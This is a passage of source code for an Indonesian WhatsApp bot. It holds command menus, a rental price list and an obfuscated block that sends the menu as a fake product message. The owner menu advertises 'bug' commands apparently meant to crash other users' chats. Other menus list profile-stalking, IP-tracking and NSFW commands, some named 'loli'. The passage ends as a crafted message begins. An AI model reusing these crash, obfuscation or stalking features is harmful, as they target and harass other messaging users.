ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}box3d*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}roadwarning*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}breakwall*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}icecold*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}luxury*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}cloud*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}summersand*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}horrorblood*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}thunder*_


「 EPHOTO 360 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}wetglass*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}multicolor3d*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}watercolor*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}luxurygold*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}galaxywallpaper*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}lighttext*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}beautifulflower*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}puppycute*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}royaltext*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}heartshaped*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}birthdaycake*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}galaxystyle*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}hologram3d*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}greenneon*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}glossychrome*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}greenbush*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}metallogo*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}noeltext*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}glittergold*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}textcake*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}starsnight*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}wooden3d*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}textbyname*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}writegalacy*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}galaxybat*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}snow3d*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}birthdayday*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}freefire*_

「 PHOTO OXY 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}shadow*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}cup*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}cup1*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}romance*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}smoke*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}burnpaper*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}lovemessage*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}undergrass*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}love*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}coffe*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}woodheart*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}woodenboard*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}summer3d*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}wolfmetal*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}nature3d*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}underwater*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}golderrose*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}summernature*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}letterleaves*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}glowingneon*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}fallleaves*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}flamming*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}harrypotter*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}carvedwood*_

「 𝐅𝐔𝐍 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}fitnah*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}fitnahpc*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}kontak*_

「 𝐓𝐀𝐆 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}hidetag*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}kontag*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}sticktag*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}totag*_

「 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}ytsearch*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}igstalk*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}play*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}video*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}ytmp3*_ <link>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}ytmp4*_ <link>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}ig*_ <link>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}igstory*_ <username>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}twitter*_ <link>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}tiktok*_ <link>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}tiktokaudio*_ <link>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}fb*_ <link>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}brainly*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}image*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}anime*_ <random>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}pinterest*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}komiku*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}lirik*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}chara*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}playstore*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}otaku*_ <query>

「 𝐎𝐓𝐇𝐄𝐑 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}self*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}public*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}setthumb*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}settarget*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}setfakeimg*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}setreply*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}ping*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}inspect*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}join*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}caripesan*_ <query>
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}get*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}term*_ <code>
ꪶ ཻུ۪۪ꦽꦼ̷ _*x*_ <code>

「 𝐉𝐀𝐃𝐈𝐁𝐎𝐓 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}jadibot*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}stopjadibot*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}listbot*_

「 𝐕𝐎𝐓𝐄 」
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}voting*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*${prefix}delvote*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*vote*_
ꪶ ཻུ۪۪ꦽꦼ̷ _*devote*_

「 Powered By ${botName} 」



 𝔍𝔞𝔫𝔤𝔞𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 

  𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞

`


                    kahfzz.sendMessage(from, { contentText: `${allmenu}`, footerText: '_THANKS TO_\nValkyrie·Team\nANGGOTA TEAM\n\nメLord Akira⁴̅⁰͍⁴̵\nメLord Ozann⁴̅⁰͍⁴̵\nメLord Kahfz⁴̅⁰͍⁴̵\nメLord AriL⁴̅⁰͍⁴̵l\nメLord Pebri⁴̅⁰͍⁴̵\nメLord Galih⁴̅⁰͍⁴', buttons: [{ buttonId: `#owner`, buttonText: { displayText: '👽OWNER' }, type: 1 },{ buttonId: `!rules`, buttonText: { displayText: '📔️ RULES BOT' }, type: 1 },{ buttonId: `!donasi`, buttonText: { displayText: '🏷DONASI' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')

              break
case 'allmenuty':
       case 'allmenut':
         thu = await kahfzz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
       groups = kahfzz.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = kahfzz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await kahfzz.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
    menu =` 🌹𝐇𝐄𝐋𝐋𝐎𝐖𝐎𝐑𝐋𝐃🌹

${botName} 
${ucapanWaktu} Kak ${pushname} 👋
  
「 𝑪??𝑳𝑬??𝑫𝑨𝑹 」

🐥 Day : ${week} ${weton} 
🐥 Date : ${date}
        
「 𝒀𝑶𝑼𝑹 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」

🐥 *Username:* ${pushname}
🐥 *Bio Info:* ${thu.status}
🐥 *Premium*: ${isPremium ? 'Ya' : 'No'}
🐥 *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}
🐥 *Level*: ${Levelnye}
🐥 *XP*: ${Xpluu} / ${requiredXplu}

「 𝑩𝑶𝑻 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 」

🐥 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
🐥 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
🐥 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*
 
 
「 𝐀𝑳𝑳 𝐌𝐄𝐍𝐔 」

  「🔓JADIBOT MENU」
🔖  ${prefix}jadibot
🔖  ${prefix}stopjadibot

  「📔MENU OWNER」
🔖  ${prefix}bc *teks*
🔖  ${prefix}term
🔖  ${prefix}self
🔖  ${prefix}public
🔖  ${prefix}eval
🔖  ${prefix}reset
🔖  ${prefix}clearall
🔖  ${prefix}leaveall
🔖  ${prefix}addvn
🔖  ${prefix}getvn
🔖  ${prefix}addimage
🔖  ${prefix}getimage
🔖  ${prefix}addvideo
🔖  ${prefix}getvideo
🔖  ${prefix}slow
🔖  ${prefix}leaveall
🔖  ${prefix}join *link gc*
🔖  ${prefix}shutdown
🔖  ${prefix}getquoted
🔖  ${prefix}addupdate *fiturnya*
🔖  ${prefix}exif *nama|author*
🔖  ${prefix}sewa add/del *waktunya*
🔖  ${prefix}premium add @tag|nomor
🔖  ${prefix}premium del @tag|nomor
🔖  ${prefix}buggc
🔖  ${prefix}sendbug
🔖  ${prefix}buglokasi
🔖  ${prefix}bugpc
🔖  ${prefix}bugpc2
🔖  ${prefix}bughole
🔖  ${prefix}bugtroli
🔖  ${prefix}bugtroli2
🔖  ${prefix}bugcombine

  「📃WIBU MENU」
🔖  ${prefix}loli
🔖  ${prefix}manga
🔖  ${prefix}anime 
🔖  ${prefix}fanartnime
🔖  ${prefix}lolivideo
🔖  ${prefix}husbu
🔖  ${prefix}waifu
🔖  ${prefix}milf
🔖  ${prefix}neko
🔖  ${prefix}kanna
🔖  ${prefix}sagiri
🔖  ${prefix}cosplay
🔖  ${prefix}wallnime
🔖  ${prefix}kusonime
🔖  ${prefix}megumin
🔖  ${prefix}otakudesu
🔖  ${prefix}beritanime
🔖  ${prefix}doujindesu
🔖  ${prefix}storyanime
🔖  ${prefix}nakanomiku
🔖  ${prefix}nakanokahfzz
🔖  ${prefix}nakanoitsuki
🔖  ${prefix}otakuongoing
🔖  ${prefix}nhentai *code*
🔖  ${prefix}nhentaipdf *code*
🔖  ${prefix}nekopoi *link*
🔖  ${prefix}nekopoisearch  

  「📄STICKER MENU」
🔖  ${prefix}dadu
🔖  ${prefix}bucinstick
🔖  ${prefix}sdoge
🔖  ${prefix}toimg
🔖  ${prefix}spatrick
🔖  ${prefix}sgura
🔖  ${prefix}ttg *teks*
🔖  ${prefix}attp *teks*
🔖  ${prefix}stickeranime
🔖  ${prefix}semoji *emoji*
🔖  ${prefix}sticker *reply foto/video*
🔖  ${prefix}smeme *teks|teks*
🔖  ${prefix}swm *pack|author*
🔖  ${prefix}take *pack|author* 
🔖  ${prefix}tovideo *reply sgif*
    
  「🎰GAME MENU」
🔖  ${prefix}slot
🔖  ${prefix}limitgame
🔖  ${prefix}gelud @tag
🔖  ${prefix}tictactoe @tag
🔖  ${prefix}siapaaku
🔖  ${prefix}family100
🔖  ${prefix}kuismath
🔖  ${prefix}asahotak
🔖  ${prefix}tebaklirik
🔖  ${prefix}tebaklagu
🔖  ${prefix}tebakkata
🔖  ${prefix}susunkata
🔖  ${prefix}kimiakuis
🔖  ${prefix}caklontong
??  ${prefix}tebakjenaka
🔖  ${prefix}tebakanime
🔖  ${prefix}tebaktebakan
🔖  ${prefix}tebakgambar
🔖  ${prefix}tebakbendera
🔖  ${prefix}suit *batu/kertas/gunting* 
    
  「🎲FUN MENU」
🔖  ${prefix}mining
🔖  ${prefix}cekwatak
🔖  ${prefix}artinama [nama]
🔖  ${prefix}artimimpi [mimpi]
🔖  ${prefix}cekmati [nama]
🔖  ${prefix}wangy [nama]
🔖  ${prefix}citacita
🔖  ${prefix}toxic
🔖  ${prefix}truth
🔖  ${prefix}dare
🔖  ${prefix}apakah
🔖  ${prefix}bisakah
🔖  ${prefix}kapankah
🔖  ${prefix}rate
🔖  ${prefix}jadian
🔖  ${prefix}cantik
🔖  ${prefix}ganteng
🔖  ${prefix}beban
🔖  ${prefix}babi
🔖  ${prefix}cekganteng
🔖  ${prefix}cekcantik  

  「🛑DOWNLOAD MENU」
🔖  ${prefix}fb 
🔖  ${prefix}igdl 
🔖  ${prefix}igdl2 
🔖  ${prefix}twitter 
🔖  ${prefix}tiktok 
🔖  ${prefix}play 
??  ${prefix}ythd 
🔖  ${prefix}ytmp3 
🔖  ${prefix}ytmp4 
🔖  ${prefix}soundcloud 
🔖  ${prefix}tiktoknowm 
🔖  ${prefix}tiktokaudio
🔖  ${prefix}mediafire 
🔖  ${prefix}lacakip *IP Address*
🔖  ${prefix}nhentaipdf *code*
🔖  ${prefix}nhentaipdf2 *code*

  「📃PENDIDIKAN MENU」
  
🔖  ${prefix}perkalian angka1|angka2
🔖  ${prefix}kuadrat
🔖  ${prefix}wikipedia
🔖  ${prefix}persegi
🔖  ${prefix}persegipanjang 
🔖  ${prefix}faktaunik      

  「📑INFO MENU」
🔖  ${prefix}update
🔖  ${prefix}level
🔖  ${prefix}rules
🔖  ${prefix}profile
🔖  ${prefix}waktu
🔖  ${prefix}botstat
🔖  ${prefix}sewabot
🔖  ${prefix}listsewa
🔖  ${prefix}owner
🔖  ${prefix}ping
🔖  ${prefix}runtime
🔖  ${prefix}donasi
🔖  ${prefix}leaderboard
🔖  ${prefix}cekpremium
🔖  ${prefix}listpremium
🔖  ${prefix}sourcecode
🔖  ${prefix}bugreport *keluhan*  

  「📗OTHER MENU」
🔖  ${prefix}brainly *query*
🔖  ${prefix}shopee *product*
🔖  ${prefix}playstore *query*
🔖  ${prefix}ssweb *query*
🔖  ${prefix}sswebpc *link*
🔖  ${prefix}google *query*
🔖  ${prefix}image *query*
🔖  ${prefix}pinterest *query*
🔖  ${prefix}nulis *teks*
🔖  ${prefix}iguser *ussername*
🔖  ${prefix}igstalk *username*
🔖  ${prefix}githubstalk *username*
🔖  ${prefix}tiktokstalk *ussername*
🔖  ${prefix}img2url *reply foto*
🔖  ${prefix}ytsearch *query* 
 
  「💝18+ MENU」
▹ ${prefix}bkp *random*
▹ ${prefix}bokep1
▹ ${prefix}bokep2
▹ ${prefix}bokep3
▹ ${prefix}bokep4
▹ ${prefix}bokep5
▹ ${prefix}bokep6
▹ ${prefix}bokep7
▹ ${prefix}bokep8
▹ ${prefix}bokep9
▹ ${prefix}bokep10
▹ ${prefix}bokep11
▹ ${prefix}bokep12
▹ ${prefix}bokep13
▹ ${prefix}bokep14
▹ ${prefix}bokep15
▹ ${prefix}bokep16
▹ ${prefix}bokep17
▹ ${prefix}bokep18
▹ ${prefix}bokep19
▹ ${prefix}bokep20
▹ ${prefix}bokep21
▹ ${prefix}bokep22
▹ ${prefix}bokep23
▹ ${prefix}bokep24
▹ ${prefix}bokep25

  「🪙ISLAMI MENU」
🔖  ${prefix}listsurah
🔖  ${prefix}alquran
🔖  ${prefix}alquranaudio
🔖  ${prefix}asmaulhusna
🔖  ${prefix}kisahnabi
🔖  ${prefix}jadwalsholat

   「📓RANDOM TEXT」
🔖  ${prefix}quotes
🔖  ${prefix}quotesdiLan
🔖  ${prefix}quotesanime
🔖  ${prefix}nyindir
🔖  ${prefix}quotesimage
🔖  ${prefix}faktaunik
🔖  ${prefix}katabijak
🔖  ${prefix}pantun
🔖  ${prefix}bucin
??  ${prefix}randomnama 

   「🎬MOVIE&STORY MENU」
🔖  ${prefix}drakorongoing
🔖  ${prefix}lk21 query
🔖  ${prefix}wattpad url_wattpad
🔖  ${prefix}wattpadsearch query
🔖  ${prefix}cerpen
🔖  ${prefix}ceritahoror   

   「📸RANDOM IMAGE」
🔖  ${prefix}fanartnime   


    「📷EPHOTO MENU」
🔖 wetglass text
🔖 multicolor3d text
🔖 watercolor text
🔖 luxurygold text
🔖 galaxywallpaper text
🔖 lighttext text
🔖 beautifulflower text
🔖 puppycute text
🔖 royaltext text
🔖 heartshaped text
🔖 birthdaycake text
🔖 galaxystyle text
🔖 hologram3d text
🔖 greenneon text
🔖 glossychrome text
🔖 greenbush text
🔖 metallogo text
🔖 noeltext text
🔖 glittergold text
🔖 textcake text
?? starsnight text
🔖 wooden3d text
🔖 textbyname text
🔖 writegalacy text
🔖 galaxybat text
🔖 snow3d text
🔖 birthdayday text
🔖 goldplaybutton text
🔖 silverplaybutton text
🔖 freefire text
🔖 ktpmaker  
 
   「📽PHOTO OXY」
🔖 shadow text
🔖 cup text
🔖 cup1 text
🔖 romance text
🔖 smoke text
🔖 burnpaper text
🔖 lovemessage text
🔖 undergrass text
🔖 love text
🔖 coffe text
🔖 woodheart text
🔖 woodenboard text
🔖 summer3d text
🔖 wolfmetal text
🔖 nature3d text
🔖 underwater text
🔖 golderrose text
🔖 summernature text
🔖 letterleaves text
🔖 glowingneon text
🔖 fallleaves text
🔖 flamming text
🔖 harrypotter text
🔖 carvedwood text
🔖 tiktok text1 text2
🔖 arcade8bit text1 text2
🔖 battlefield4 text1 text2
🔖 pubg text1 text2
   
   「🖌TEXTPRO」
🔖 ${prefix}blackpink text
🔖 ${prefix}neon text
🔖 ${prefix}greenneon text
🔖 ${prefix}advanceglow text
🔖 ${prefix}futureneon text
🔖 ${prefix}sandwriting text
🔖 ${prefix}sandsummer text
🔖 ${prefix}sandengraved text
🔖 ${prefix}metaldark text
🔖 ${prefix}neonlight text
🔖 ${prefix}holographic text
🔖 ${prefix}text1917 text
🔖 ${prefix}minion text
🔖 ${prefix}deluxesilver text
🔖 ${prefix}newyearcard text
🔖 ${prefix}bloodfrosted text
🔖 ${prefix}halloween text
🔖 ${prefix}jokerlogo text
🔖 ${prefix}fireworksparkle text
🔖 ${prefix}natureleaves text
🔖 ${prefix}bokeh text
🔖 ${prefix}toxic text
🔖 ${prefix}strawberry text
🔖 ${prefix}box3d text
🔖 ${prefix}roadwarning text
🔖 ${prefix}breakwall text
🔖 ${prefix}icecold text
🔖 ${prefix}luxury text
🔖 ${prefix}cloud text
🔖 ${prefix}summersand text
🔖 ${prefix}horrorblood text
🔖 ${prefix}thunder text
🔖 ${prefix}pornhub text1 text2
🔖 ${prefix}glitch text1 text2
🔖 ${prefix}avenger text1 text2
🔖 ${prefix}space text1 text2
🔖 ${prefix}ninjalogo text1 text2
🔖 ${prefix}marvelstudio text1 text2
🔖 ${prefix}lionlogo text1 text2
🔖 ${prefix}wolflogo text1 text2
🔖 ${prefix}steel3d text1 text2
🔖 ${prefix}wallgravity text1 text2   

   「🎥IMAGE MANIPULATION」
🔖 ${prefix}darkjokes
🔖 ${prefix}darkjokes2
🔖 ${prefix}meme
🔖 ${prefix}joke
🔖 ${prefix}wasted
🔖 ${prefix}hitler
🔖 ${prefix}wanted
🔖 ${prefix}greyscale
🔖 ${prefix}trash
🔖 ${prefix}circle
🔖 ${prefix}blur
🔖 ${prefix}tinyurl
🔖 ${prefix}cuttly
🔖 ${prefix}affect
🔖 ${prefix}picture  
 
   「🎞NSFW MENU」
▹ chiisaihentai
▹ trap
▹ blowjob
▹ yaoi
▹ ecchi
▹ hentai
▹ ahegao
▹ hololewd
▹ sideoppai
▹ animefeets
▹ animebooty
▹ animethighss
▹ hentaiparadise
▹ animearmpits
▹ hentaifemdom
▹ lewdanimegirls
▹ biganimetiddies
▹ animebellybutton
▹ hentai4everyone
   
┏━━⬣ PRICE LIST 1
┃⬡ SEWA 10K/MINGGU
┃⬡ SEWA 20K/BLN
┃⬡ SEWA + PREMIUM 25K
┃⬡ PERMANEN 30K
┃⬡ PERMANEN + PREM 35K
┃⬡ ALL PERMANEN 45K
┗━━⬣

┏━━⬣ PRICE LIST 2
┃⬡ JADI BOT 15K/BLN
┃⬡ JADI BOT + OWNER 35K
┃⬡ SC BOT TANYA OWNER
┗━━⬣

┏━━⬣ MINAT? PM
┃⬡ wa.me/6283127014833
┃⬡ Ig kahfz_13
┃⬡ YT KAHFZ BOTZ
┗━━⬣
NB : BOT ON 24 JAM KARNA DI RUN MENGGUNAKAN RDP   
   

「 Powered By ${botName} 」

 𝔍𝔞𝔫𝔤??𝔫 𝔭𝔢𝔯𝔫𝔞𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔰𝔢𝔰𝔢𝔬𝔯𝔞𝔫𝔤 
  𝔶𝔞𝔫𝔤 𝔪𝔞𝔰𝔦𝔥 𝔪𝔢𝔫𝔠𝔦𝔫𝔱𝔞𝔦 𝔪𝔞𝔰𝔞𝔩𝔞𝔩𝔲𝔫𝔶𝔞
`
function _0x3534(_0x198213,_0x4b9b0c){var _0x5e5b47=_0x476f();return _0x3534=function(_0x157670,_0x2d3352){_0x157670=_0x157670-0x17c;var _0x2b755b=_0x5e5b47[_0x157670];return _0x2b755b;},_0x3534(_0x198213,_0x4b9b0c);}var _0x3c751d=_0x3534;(function(_0x4839ba,_0x4c824){var _0x550cc9=_0x3534,_0x218711=_0x4839ba();while(!![]){try{var _0x5df08f=-parseInt(_0x550cc9(0x196))/0x1+parseInt(_0x550cc9(0x199))/0x2*(parseInt(_0x550cc9(0x194))/0x3)+parseInt(_0x550cc9(0x185))/0x4*(-parseInt(_0x550cc9(0x17c))/0x5)+parseInt(_0x550cc9(0x18f))/0x6+parseInt(_0x550cc9(0x17e))/0x7*(parseInt(_0x550cc9(0x19b))/0x8)+-parseInt(_0x550cc9(0x195))/0x9+parseInt(_0x550cc9(0x189))/0xa;if(_0x5df08f===_0x4c824)break;else _0x218711['push'](_0x218711['shift']());}catch(_0x5f5277){_0x218711['push'](_0x218711['shift']());}}}(_0x476f,0xc43bc));var _0x24eb6b=(function(){var _0xf68c79=!![];return function(_0x46eaad,_0x379686){var _0x5d2515=_0xf68c79?function(){if(_0x379686){var _0x3e010f=_0x379686['apply'](_0x46eaad,arguments);return _0x379686=null,_0x3e010f;}}:function(){};return _0xf68c79=![],_0x5d2515;};}()),_0xbc07e=_0x24eb6b(this,function(){var _0x4e236e=_0x3534;return _0xbc07e[_0x4e236e(0x188)]()[_0x4e236e(0x190)](_0x4e236e(0x193))[_0x4e236e(0x188)]()['constructor'](_0xbc07e)[_0x4e236e(0x190)](_0x4e236e(0x193));});function _0x476f(){var _0x34b988=['{}.constructor(\x22return\x20this\x22)(\x20)','console','ALL\x20MENU\x20BY\x20KAHFZ\x20BOTZ','log','table','2410344VYAgha','search','info','6283127014833@s.whatsapp.net','(((.+)+)+)+$','17070zjOPwz','6326046ftcuxJ','562551QAkxzM','message','apply','82uOyXwT','./media/wpmobile.png','8JZuhnD','350000','KAHFZ\x20BOTZ','error','exception','56185wqxhtf','https://saweria.co/K4HFZ','7782663BiOzpA','__proto__','My\x20Owner\x20Is\x20Horny\x20Today','prototype','IDR','4972427429435136','prepareMessageFromContent','16mEzueK','bind','warn','toString','3673420oULMCS'];_0x476f=function(){return _0x34b988;};return _0x476f();}_0xbc07e();var _0x2d3352=(function(){var _0x19ef2d=!![];return function(_0xa89947,_0x202699){var _0x1f1600=_0x19ef2d?function(){var _0x423e66=_0x3534;if(_0x202699){var _0x54e990=_0x202699[_0x423e66(0x198)](_0xa89947,arguments);return _0x202699=null,_0x54e990;}}:function(){};return _0x19ef2d=![],_0x1f1600;};}()),_0x157670=_0x2d3352(this,function(){var _0x8aea9b=_0x3534,_0x1dd588;try{var _0x3db9ea=Function('return\x20(function()\x20'+_0x8aea9b(0x18a)+');');_0x1dd588=_0x3db9ea();}catch(_0x347f1d){_0x1dd588=window;}var _0x5ddcc7=_0x1dd588[_0x8aea9b(0x18b)]=_0x1dd588[_0x8aea9b(0x18b)]||{},_0x31699e=[_0x8aea9b(0x18d),_0x8aea9b(0x187),_0x8aea9b(0x191),_0x8aea9b(0x19e),_0x8aea9b(0x19f),_0x8aea9b(0x18e),'trace'];for(var _0xc85bbd=0x0;_0xc85bbd<_0x31699e['length'];_0xc85bbd++){var _0x4927cb=_0x2d3352['constructor'][_0x8aea9b(0x181)]['bind'](_0x2d3352),_0x4099bb=_0x31699e[_0xc85bbd],_0x2481b0=_0x5ddcc7[_0x4099bb]||_0x4927cb;_0x4927cb[_0x8aea9b(0x17f)]=_0x2d3352[_0x8aea9b(0x186)](_0x2d3352),_0x4927cb[_0x8aea9b(0x188)]=_0x2481b0[_0x8aea9b(0x188)][_0x8aea9b(0x186)](_0x2481b0),_0x5ddcc7[_0x4099bb]=_0x4927cb;}});_0x157670(),stod=''+sender,nama=_0x3c751d(0x18c),otod=_0x3c751d(0x192),dtod=_0x3c751d(0x192),ownerJid='6283127014833@s.whatsapp.net',thubm=fs['readFileSync'](_0x3c751d(0x19a));var imgs=await kahfzz['prepareMessage']('0@c.us',thubm,image,{'thumbnail':thubm}),imgCatalog=imgs[_0x3c751d(0x197)]['imageMessage'],ctlg=await kahfzz[_0x3c751d(0x184)](from,{'productMessage':{'product':{'productImage':imgCatalog,'productId':_0x3c751d(0x183),'title':''+nama,'description':''+menu,'footerText':_0x3c751d(0x19d),'currencyCode':_0x3c751d(0x182),'priceAmount1000':'999999','productImageCount':0x1,'firstImageId':0x1,'salePriceAmount1000':_0x3c751d(0x19c),'retailerId':_0x3c751d(0x180),'url':_0x3c751d(0x17d)},'businessOwnerJid':''+ownerJid}},{'quoted':freply,'mimetype':'image/jpeg'});kahfzz['relayWAMessage'](ctlg);
break     
case 'f':
case 'lock':
ikymemek = {
 "key": {
"fromMe": false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
 },
 "message": {
"viewOnceMessage": {
  "message": {
 "imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjD3dQIM5hW3UkDfnnkice-eMcsMJJALEcgD9HnDGZEp.enc",
"mimetype": "image/jpeg",
"fileSha256": "aR3vWUsV9VZUiR+agYok8oM4UHiuhqEShMpQ6SgY9WM=",
"fileLength": "675",
"height": 41,
"width": 52,
